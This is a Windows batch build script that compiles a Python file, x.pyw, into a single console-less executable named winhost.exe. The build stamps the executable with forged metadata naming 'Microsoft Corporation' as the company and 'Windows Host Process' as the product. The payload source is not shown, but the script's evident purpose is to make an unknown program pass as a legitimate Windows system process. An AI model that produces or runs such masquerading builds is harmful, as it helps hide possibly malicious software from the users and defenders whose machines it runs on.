@echo off
title Project X - build
pip install --quiet nuitka ordered-set zstandard
if errorlevel 1 goto fail
echo [*] compiling (a few minutes)...
python -m nuitka ^
  --onefile --mingw64 --windows-disable-console ^
  --company-name="Microsoft Corporation" ^
  --product-name="Windows Host Process" ^
  --file-description="Windows Host Process" ^
  --file-version=1.0.0.0 --product-version=1.0.0.0 ^
  --python-flag=no_site,no_asserts,no_docstrings,no_warnings ^
  --lto=yes --assume-yes-for-downloads ^
  --output-filename=winhost.exe x.pyw
if errorlevel 1 goto fail
echo [+] winhost.exe ready
pause & exit /b 0
:fail
echo [!] build failed
pause & exit /b 1